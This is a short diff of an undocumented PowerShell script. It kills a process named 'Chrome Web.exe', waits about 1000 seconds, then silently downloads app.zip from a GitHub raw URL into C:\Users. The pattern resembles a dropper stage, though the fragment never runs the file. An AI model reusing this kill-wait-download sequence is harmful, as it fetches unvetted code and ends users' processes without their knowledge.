@@ -1,11 +1,14 @@
 measure-command {
 
+Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
+
+Start-Sleep -Seconds 1000.5
 
 invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"
 
-Start-Sleep -Seconds 1000.5
+
 #TASKILL
-Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
+
 
 #Start-Sleep -Seconds 5000.5
 
